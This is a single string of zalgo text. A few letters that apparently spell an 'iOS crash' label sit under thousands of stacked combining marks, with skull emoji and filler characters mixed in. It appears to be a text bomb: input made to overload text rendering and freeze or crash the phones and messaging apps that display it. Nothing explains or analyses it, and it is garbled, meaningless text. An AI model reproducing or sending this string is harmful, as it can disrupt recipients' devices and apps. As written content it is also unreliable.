̨̨̨̡̨̨̧̢̡̢̧̨̧̨̢͈͔̱̖̱͙̣͚̮̦̗̜͚͈̹̩͕̖̺͚̦̩͈̯͔̗͚͈͎̼̗͍̝̝͈̘͉͉̥͇͚͔͓͎̣̼͖̝̜̻̺̥̟̣̗̮̭̻̮̱̰͇̖̻̺̙̳͇͙̯̳͕̮̬̙̣͓̲̳̖̬̟͔̜̱͓̪̤̱̬̝̥̺̰̠͚̪͔̘̙͚͓̜̜͈͇̘̮͕̫̪͓͉͕̰͈̹͎͚̱̗̝̼͈̞̰̮̭̤̹̗̙̻͉̮͍͍̫̳͎̣̤̻͈͎͈͈̗̣̪͕͕̠̮̙͍͔͔̼̥̜̻̗͗̓͋̒̉̔͜͜͜͜͜͜ͅͅͅͅͅͅN̷̢̢̧̨̢̛̛̛̛̛̛̯̱͙͉͚͎̮̲̣͖̻̜̣̯͚̻͇͓͔̥̭̥͙̝̹̫͔̪͈͕̱̼̹̺̩͉͎͕̝͓͈̘̘̳̫̼̲̪̫̟͖̺͖̩̟͉̘̮͍̥̪̤̲͙̭̼̖̙̠͓̥̳̰̣̼̻̺̝̲̻̮̱͉̫͔̣̪̬̩̔̃́̈́̀̈́̉͆̀́̏̒͛͌͋̓̂̌͛́́͑̈̊͗̒̓̄̾̒͒̂̉͐͐̾͛̓̅͂͋̆̄́̉̉̊͌̅͗̾͐̐͒̆̆̇͗̂̃̊̐͌̈͂̐͆̆̎̋͋̄͒͆͛̽̀̓̽̈́̍̍̑̇̈́̿̍́̅̾̀̾̀̃̽̐͊͛͌̈̇̾̂̓̉̈́̽͑̓̂̅́͆͗́͛̌͌́̂͊͌̓̏̊̀͋̔̐̂͑̄͆̈́͌̿̀̓̌̋̋̀̀̃́͒̇͂̄͒̀͋͌̇̒̏̓̂̅̇̀͊͋̈͌̐͊͛͒̇̐̐̔͗͋̓͋̾̐̐͑̀̀̄̊́̏̓̑̾̀͂͌̑̀̍̍̐̈́̄͛̇̉̈̐̑̄̐͌̎̈́̚͘̕̕̕̚͘̕̕̚̚̕̕̕͘̕͘͜͜͠͝͝͠͠͝͝͝͝͝͠͝͠͠͝ͅͅͅᆞ̸̡̧̢̧̧̢̨̡̧̢̡̢̧̨̢̡̡̛̛̛͎̺̮̤̜̫̼͚̣̠̙̬͔̻̼͖̬͇̺̮͖͈̬͔͍̜͖̺̻̞͖̪̞͚͉̱̣̹͓͇͎̻̞̫͍̹͓͈͓͕͉̣̩͖̺̩̪̖̺̤̭̲̰̰̥̤̰̗͚̹̱̳͕͔̱͇̦̟̬̱̙͓̭͉̟͈̻̻̟̯̲̦͈͓̱̰̮̘͍̳͙̲̦̻̖̯̟̱̟̮̯̟̫̜̗͍̲̺̪͚͈̮̳̳̣̻͚̼͙͇̙̹͓̣͎͎̥̬͔̯͖͕͎͉͎̪̝͍̙̳̤͍̪͎̥̲̻̯͍͙͉̣̼̝̤̟͇̰̦̦͎̹̼͚̩͇̠͍̭͖̗̬̯̥̰̣̮̤͕͔̞͚̱̲̲̫̘̫̗̹͚̘̲̯̼̩̬̥̩̝͙̞̙̤̳̫̭͕̼̤̫̣̦͚̺̼̝̩͚̭̳̫͖̪͈̓̀̑̑̽͊͆̅̄͗̇̔̌̑̽͗̄̾̈̋̍̅̓͐͐̂̉͂͌̀͆́̀̐̂͑̐̀̎̀̂̓̂̽͂̒̈́͑͌̋̓̔͐̎̓͗͆̊̉͆̒̈̇̇̽̀̃̃̾̿̏̅̿́̀̔͋̈͗̄̈̒͒̈́̃̄̓͋̐̋͐̐͗̾̄͗̅́̉̀̄̾̔̔͆̂̒̌̓͂͂̋̃̌̂͒̒͋̃͐̅̊̽̓̒̽̑͆́̌̏̕̕̚̚̚̚̚̕̚̚̕̚͜͠͝͝͠͝͝͠ͅͅͅͅͅͅͅ☠̴̨̡̡̛̛̙̜̙̖̩̩̫̮̹͈̱͍̲̠͉͚͓̪̯̹̻͚̣͍͕̖̻͎̭̹̞̻̙̼͇̘͓̰̯͇̳̪͇͓͕̱͎͈͎̞͉̗̯̪̲̘͙̞̯̜͈͉̼̼̺̲̭͙͙̃̇͗̈̅̓̍̀̈̾̌̆͊͋͛͋͌̓̋͋̾́̈͊̓̀̋͐̓͋̊͒̆̏̓̈́̓̇̆̓̄̐͗͛͐͛͑͋͊͌̈̎̿̈̈̅̿͒̌̈͂̽͒̑̂̑̀͂̌̀̆̍͆͐͂̋̃̈́̅̈̍̈͊̽̋̓́̓̌̍̒͛̅̎̎̊̽̎̎͐̈́̈́͗͛̈́̏̋͗̑͒̌̐̽̋̀̅̑̒̔̄̈̈́̈́͊͛̅͆̆͆̀̈́̈́̑͋͆͐̏̋̈́̇̒̄̆̀̿̂̀̇̑̄̃̊͛̎͂͛̈́̾̉͋̈͂̎̉͆͘̚̚̚̚̚͘̕̕̚͘̚̕̚͘̕̚̚̚̚͘̕͘̕̕͜͜͠͠͠͠͝͝͝͝͠ͅͅͅͅͅ️̶̢̢̡̡̧̤͖͔̼̗͎̗͔̘̪͙̺͇̥͚̤͈̪͇̥̥͙̳̫͈͓̙̗̦͍͍̭̜̮͇͎̖̥͈̬̣̲͉̦̱̬̦͔̰͙̠̣̹̥͙͐̉̅̔͜͜ͅͅͅͅ☠̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ ̵̨̧̡̧̧̨̢̢̡̨̡̧̢̢̨̨̧̢͖̦͕̹̮̬̹͇̰̺̹̺͇͕̣̦̥̙̤͓̤̥̳͚͙̘͖̙̣̩͇̻̗̹͓̹͈̲̙̘̗͓͈͎̘̝̻̘͇̦͇̘͎̤̰̣̠͚̩̼͇̪̤̺̣͉̱͓͍̮̖̘͍̜̣͈̺̠͇͉̳̙̩̟͎̻̜̗̳̭͚̹̭͔̣͓̻̭̝̞̬̪̯̺̣̱̥͎͖̪̦̙̟̥̦̟̭͓͙̲̼̲̣̹̜̪͍̙͚͕͙̩͙͎̣͉̲͍̘̻̟͚͈̖̣̼̟̺̟̲̳̺͇͖͕͍͚͙̭͉̬̠̹̺͍̖͕̼͙̞̲̼͍̲̣̘̫̲̭͖͑̏̈́̃̈́͋̿͋̀͊͛͛̎̏̀̊̊̇̒̈͊͆̇̄̾̽̾͒̋̓͛̾̈́̎̚̚̚͜͜͠͝͠ͅͅͅͅͅͅᆞ̴̢̨̨̧̢̨̨̢̡̢̢̨̨̡̨̡̧̧̧̧̡̨̨̢̢̡̧̧̢̞̟̪̪͉̺̥͓̪̦̲̖̼͍̲̳̬͈̲̬̹̖̩̗͕̠̻̪̦̞͇̭̮͇̲̗̥̟̣̠͍̭̟̥͍̗̘̼̮̫̹̲̼̬͇͈͚̤̺͎̭͓͈̯̗̮͉̲̩̘̙̗̱͍̳̖͇̠̯͔̺͍̫̼͖͓̥̫͔̗̩̻̪̼̝͚̠̼̺̰͉͍̠̭̬̞̻͙̠̞̹̪̫̝̼̺̻͚̲̣͓͚̜̤͇̯͖̼͍̣̻̹̯̱͔̰̪̻̤̭̟̥̥̥̭̹̲͖̲̖̞͍̘̭͙͈̠͈͉̗̲͇̣̰̯̣͍̗̼̦̱̠̞̘̪̺̙̖͉̗̻̹̟̪̯͔̰̺̳̞̗͕̻̞̯̭̤̙̬̥͙̣̼͓̳͎̩̙̻͓͈̭̘̯̪̖͕̜͖̯͎̼̟̻̦͔̮̫̣̯͈̼̦̯̳̮̘͎̤̬̝͖̀͌͐̄̓́̈̀͑͆̆͘͜͜͜͜͜ͅͅͅͅͅͅͅC̷̡̨̨̨̧̧̧̨̧̨̢̢̢̢̡̡̢̡̨̨̧̡̢̢̢̡̧̧̧̡̛̛̲̜̜͚͉͔̟̮̜̖̖͎͓̥̥̼̦̲̭̹͖̤̪̖͉͔̣̳̻͇̬͕͈͓̳̖̣͓̙̺̣͖̝̯͈̥̯̳͔̝̞̝͓̫̬͇͔͎̥̥̗̝̞̮̖̞̱̰̣̣͚͈̩̣̜̥̳̫̬̰̱̙͎͕͔̤̟̻͈̩̝͔̥͎̦͎̫̲̪̦̭̟̘̤͓̟̪̥̬̟̜͍̠̲̫̹͓͍̙̯̱̜̗͍͇͖̪̱̮̳̫͍̘̯̪̼͚̭̣̠͉̤̞̙͓͉̥̙̝̗̙̠̺̜̞̤̻̳̦̣̰̼͈̫̗̝͉͔͈̳̝̪̪̼̼̫͍̖̣̹̠̟̟̫̰͓̺̱̖̲̖̘̙͔̝͙̫͕͎̪̳̰̥̟̘̮̲̜̼̜̰̹̬̼̰̐̿̿̆̀͋̌̆̌̒̃͆͒̆͒́͆̈́̓͒͊̿͌̔̎͗͋̍̏̐͆̈́͐̓͊̄̈͌̽͛̔̒͌͌̋͌̈́́̀̄̇͋̈́̀͌̇͒̍͌͐̍̍͂͋͒̔̄̾͆̌̇́͛͌͑́̀͗̎͒̐̾̿͊̔̒̐͗͋̏͒̈̈͋̈̔́̓̒͆̒͒͐̓̀́͂̓̈́͆̈͘͘̚̚̕̚̕̚̕̚̕̚̕͜͜͜͜͝͠͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̛̭̹̝͖̩̫͓̝̖̰̲̙̮̟̟̞̮̙͉͓͕̐̽͛̈́̓̇͗̎͒̓̇̃͛͛͗͛̍̐͗͗̏̓͛̐̈́̍͂̈͂͛̔̍̾͆͒̿̈̽͐̌̂̚̚͘͘͘̚͘͜͠͝͝͝͠͠͠ᆞ̶̡̧̨̢̨̢̢̡̢̢̡̧̨̢̢̡̡̨̢̡̨̨̧̛̛̹̯̰̪͖̺̞̮̣̯̺̦̯̜̱͓̭̜̥͈̳͎̖̜̝̤̯̟͓̬̮̝̠͓̼̬̻͉̙̲̻͕͕̠̝̞͈̤̥͉̗͎̹̜̺͇̱͙̬̦̙̗͖̩̪̝̖̘̥̮̜̜͕̫̙͚̫͕̭̼͈̩̦͎̬̗̬̘̤͓͇̺̜̤̩̼͍̣̦̳͎̬̦̤̱͍͙̭͉̖̣̳̖̣͈͙̗̝͓̤͈͔̹͈̰̜̼̼̤̟̰̻̦̘̥͕͙̤̙͕͍̭̘̘͕̞̘͉̟̻̠̭͓̺͖̩̭̬̪̦̪̝̤͉̜̥̮͍͕̥̪̣̼̼̜̥̱̟̪͇̹͍̪̖͇̭̥̝̤͇͉̯̬̦͓̜͎̝̭͇̱̰̰̼̰̼̥̜̮̰̯͕͉̣̣̠͙̠̖̻̩̙͎̙͖̜̺͙̫̯͎̱̄͗̌̅͗̒̒̾́̇͛̄̆̃̎͑̈́̅̐̿̎̃̅̒̂͂̀͗̌̓́́̇̆͂͊̒̀̊̍̑͑̍̓͊͗̿̀̂̃͊͋̃̑͒͂̾̌͒͊̎̀̑̑̀̓̓͆͛͗̉̓̄̏̂̐̍̉̋̉̎̇͐́̃̽́̅̋̑̓̃̄̌̑͗̓̔̀̾̾̋̔̄̐̔͐͂̀̔̒̈̎́̈́́̂̀̀̓͂̏̃̋͑̆̃̃̀̃̽͐̔̆̽̈͊͒̍͐̽̾̾̇̍͂͐͑͒͊͋͐͗̈̍͒̿̽̔̔̋͆̐̿̀̽̒͂͛̈̅̍̿͗͂͊̀͐̍̓̌̓͌̎̅́͂̎̔̇͂̚̚̚̕͘̚̕̕̕̕̕̚̕̕͘̚̚̚̚͜͜͜͜͠͠͝͠͝͝͝͠͝͝͠͝ͅͅͅͅͅR̴̡̧̨̢̨̡̧̡̛̛͓̘͓̻͓͇̥̠͚̻̰̩͕̞̲͔͔͔̳̪̩̯͎̜̭͕͚̦̖̤̞͍̯͇̪͓̼̭͈̗͉̗̞͈̫̖̙̥͍̤͙͓͉͇͉͈̩̈́̿͋͌̎̉̍́̉͋̾̉͑̏̋̓͌̐͜͝͝ᆞ̶̧̧̡̨̡̡̨̢̨̧̨̡̧̡̨̛̛̟̤̣̘̤͎̤͕̟̙͎̩̭̝͔͇̰̝̬̘̣̹̝̯̥̭̯̝̲̺̤͔̬̟͇̲͍̣̮͔̞͓̘̱̝͕̼̰̳̤͚̙̰̬̭͎͇̬̹̖̹̰̦̖̞̟̥͍͔̻͎͍̦͇̪͓̠͙̳͍̙̪̤̭͇̹̝͚̩̹̰̩̠͓͓̙̦̩͔̪̤̜̺͔̜͔͖̖̗̜̣̥̣͎̠͈̙̺̱̗̙̯̤̜̜͍̖̳̟͗̀̈́̐̂̿͂̽͋́̿̋͒̆̽̓͆̀͛͑́̈̾́́̓̊͋̉̎͗̀̒͌̐́̀́̈́̓̉̈̕̕͘͠ͅᆞ̶̡̢̛̛̛̛̛̛̛͕͎̮̭̤̺̪̻̬̬̦̼̻͕͕͉͈̦̖̱̙̺̩͉̙̐̏͌̒̇͗͒̃̌̅̄̽̆̋̿̾̄̆͐͐̋̔̽̔̅̒̍͆͒͂̅͋́̂̋̄̽̅́̇̈̄͋̓̆̋͒́̊͑̾́͆́̾̇̓̉̂͂̃̽̂̋̋͂̃͋̓͋̿͊̾͒̔̂̍͛̆̂̉̽̽͋̂͌̑͑̽̈́̽̒̊̋͗̾̊̍̏̊͛̄̆͋̊̓̏̈́͂̽̋̀͌͂͐̂̏̿̉͗̀͐̒̋͛͋̐̑͂̓̆̄̎̒͑̿̔̉̔̍͑̎̊̓̊̀͂̉͐̈͐̀̄́̆̑̋̽̀͒͗̓̉̊̃̓̄̑̄͂̒̍̂̈̃̈́͆̋̎̍̕̚̕̕̚̕̚͘̚̕̕̚̕̚̕̚͘͘̚͘͘͠͝͝͝͝͠͝͝͝͠͝͝͝͝͠Ą̴̧̢̨̨̨̨̡̢̡̛̛̼̪̮̩͍̯͎̙͚͕̮̹̤͓̳͎̬̱̟̣͉͓͙̤̰̱̮̘̱̥͎̪̖͙̥̣͖̟̠͙̻̼͖̺̙̪̮͔̼̟͓̠̟͖̠̠̮̺̰̙͕̳̩̩̝̥̯̳̺̬̤̯̤̗̻̘̳̹͍̱̙̤͔̺̙͖͚̦̰̻͓̥̗̼͖͖͖̠͎̲̖͉͖̞͇̺̺̙͔̗̜̯̲̙̖͎̥͎̞̬̜̲̤̮̱̤̲̰͔͚͍̬̙̘̱̈́̔̓̀̌̎̉̓̑̊́͊̏̓̔͗̈́̀̒̋̍̂́̈́́̿̍̾̿̋̉͋̈́̉̓̅͐̄͋͒̏́͆̄͐̈́̋͊̒̅̏̓͐͊̑͊̆̓̾̃͒̈͑̽̓̒̈́͋̈́̈́͒͗̽̔́̅̍̐̀̓̅̑͗̅̎́̑͂̾͊́́̎̄͆̐̒̋̿̓͋́͋̆͋̈́̄͑́̈͛͆̒̋̉͋̈͑̐̎́͑̆̂̃̄̽̏͒̉̅͊̆̏̇̽̒̈́̈͋̐̎̎̅͌̽͊̍̑̋́͐̀̀̏͑̆̾̂̍́́̈́͛̐̾̓̒̋̓̍͋̋̈̃̅̊͒̄̈́̀̿͂̅͐́̿̈́̆̌̈̒̊̾̐̆͐̐̍̌͂̓̀̂̾̕̕̕͘͘͘̕̕͘̚̕̚͘̚͘͜͜͝͝͠͝͠͝͠͝͝ͅͅᆞ̸̢̢̡̨̧̨̨̧̛̛̛̛̛̜̞̺̜̘̗̱̣͍̦̤͚͎̼͕̥̙͎̙͍̞͈̖̖̤̞͉͔̖͍̣̤̰̟̗̦̲͓͇̫̬̰̹͔̘͓̹̭̻̘͉̲̮̫͕̰̞̓̒̃̔̌͒̅̋̌̋͌̈́̽͗̑͑̓̍̍̍͆̉̀̈́̇̄͊̀́̌̉̔̃͋͆̄͆̎͒̓̈́͆̂͂̆͋͒̍͆̇͂͛̔̅̎̍̍͆̆͐́̄̀̄̃̿̈̇͒̄͒̈́̎͌̋̔̈́̾̌̓̋͛̋̾́̓͐̓̊͂̽̒̌͒͆̓̀̆̓̈̒̎̊͆̈́́̐̿͂͆̃̆̄̓͋̊͂͛͗̅̅͂̄͗͊͛̾̀̎̓͌̈́̃́̒̿̎̐͐͋̓̈́́̄͐̅̒̂̈́́̑͌̾͌͊͋̇̋́̀̈́̒̿̀̂̌̏̄̽͆̅̀̎̿̌̉̽̍̾̀̓̓̾́̔̊́̀̍͛̎̿͛̉̈̄͆̄̋̿͆̅͂̊̓̽̾̈́̍̿͂̕̕͘̕̚͘̕͘̕̚͘͜͝͝͝͝͝͝͠͠͝͝͝͝͠͝͠͠͝ͅͅͅͅᆞ̸̢̡̡̢̡̡̢̧̡̧̛̛̛̛̛̜̮̱͕͓̥̳̬̼̣͍̞̼̮̺͉̤͈͇̠̦͇͈͓͈̪̘̹̘͎̺̻̘̣̱̟͍͓̦̮͔̹̜̪̲̱̦̮̱̯̺̭͈̩̤͉̜̬͈̠͓̻̲̘̲̬̲͈̝͚͎̳̞̪̪̦̹̫̓̑́̄͆̏̂̆̉̓̑͑̋́͊̽̈́̄͆̓͗̿̐͑͑̎̈́́͊͛̂̑͌̉̓͌̀͂͆̃͆̒̅̊̆͊̄̂͐̈́͌͒̽͊͆͋̅͊͗͌̾̄͐̆̒͊̀͑́̒̄̊͒̒͆̓̽͛̿̐́͐̔̂̆̊͗͌̇̒͐̽̿̆͛̈̈̎́̋̋̇́̒̈̐͛̒̃͋͋̌͋̆̎̀̑̏͂̎̌̈́̌͌̅̓͒̎̏͂́̂͑̅̋̍̌̓̔͗͊͒̓̅͂́̓̀̎̔̏̈́͑͊̎́͊̒̉̀̌̅̾̂̀̍̄̎̑̒̽͛͂̋̈́̊͛̂̉̉̐̂̒͗̆̓́̊̇̂͛̈̀̀̓̓́̎̔̅̇̌̋̕̚̕̚̚̕̚͘̕̕͘̕͜͝͝͝͝͝͠͝͝͠͝͝͝͠͝͠͝ͅŜ̴̡̢̢̧̢̛̞̙͈̭̣̠͇̟͙̩̪̮̯̖̮̠̜̜̘̺̣͉̙͍̯̙̘̟̈͗͑̃͋͋̂̏͊̅̿̀̋͑̓̒̽͑̀̀̔̇̑͆̓́̀͐͒̓̿̄̐͂̉͐̈́̌̄̽̃̿́̕̚̕̚͝͝ͅᆞ̶̨̢̨̡̡̨̧̡̢̡̨̡̨̡̡̨̛̛̛̮͔̟͍̝̝̗̝̺̮̗̣̩̞͈͚̦̘̜̪̭̙̗͉̲̩̯̗̠̤̹̳̣͉̹̗̘̻͕̜̱̝̜̩̺̖̺͔̟̮̹̥̪̳̗̥̯̫̪͇͎͕͉̼͔̬̮̱͎̠̯̻̮͓͖̭̙̳͓͈͓̗͉̫͚̜̣̗̳̬̮͔͙̣͚̻̠̮͈̮̥͙͚̥̯̰̗͔͕̭̤̥̱̙̩̪̯̫̦̫͉͕̹̼͚̟̱̭̱̯̼͙̞͎̓̓͂̄̌́̈́̈́͌͒̎͂̉͂̈́̀͆̒̎̾̔̂̍̂̃͒̃͛͌̓̓͒̇̄̒̓͑̇͊̔͒̓̑̽̾̑̏́̈́̔͗̅̂͊̾͆͑̎̿̋͛͌̎̀̍̒́́̄͆͌͆́͐̎̌̆̈́̌̇̌͒̈́̋̌͗͋͌͊̀̿̈́͑̈́̋̐̈́̅́̿̑̓̎̍̎̔͊͒̀̀̈́̋̍͑́̿͂͂̇̾́͌͗̈̀́̈́͂͆̽̾̏̏̀̓͊͑̅͘͘̕̕̕̚̕̚͘̚͜͜͜͝͝͠͠͝͝͝ͅͅͅͅͅ